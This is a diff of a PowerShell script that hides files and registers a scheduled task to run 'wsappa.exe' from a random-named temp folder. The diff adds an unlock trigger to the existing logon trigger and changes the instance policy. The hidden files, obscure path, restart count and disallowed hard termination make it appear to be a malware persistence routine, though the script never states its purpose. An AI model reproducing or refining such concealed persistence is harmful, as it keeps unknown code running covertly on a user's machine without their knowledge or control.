@@ -38,9 +38,9 @@ Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attribute
 Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
 
 $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
-$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
-
+$taskLogonTrigger = New-ScheduledTaskTrigger -AtLogOn
+$taskUnlockTrigger = New-ScheduledTaskTrigger -AtUnlock
+$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances StopIfRunning -RestartCount 10
 
 #create startup task
 $taskXml = @"
@@ -55,6 +55,10 @@ $taskXml = @"
     <LogonTrigger>
       <Enabled>true</Enabled>
     </LogonTrigger>
+    <SessionStateChangeTrigger>
+      <Enabled>true</Enabled>
+      <StateChange>Unlock</StateChange>
+    </SessionStateChangeTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -64,7 +68,7 @@ $taskXml = @"
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <MultipleInstancesPolicy>StopIfRunning</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
@@ -99,7 +103,6 @@ $taskXml = @"
   </Actions>
 </Task>
 "@
-
 
 $taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")
 
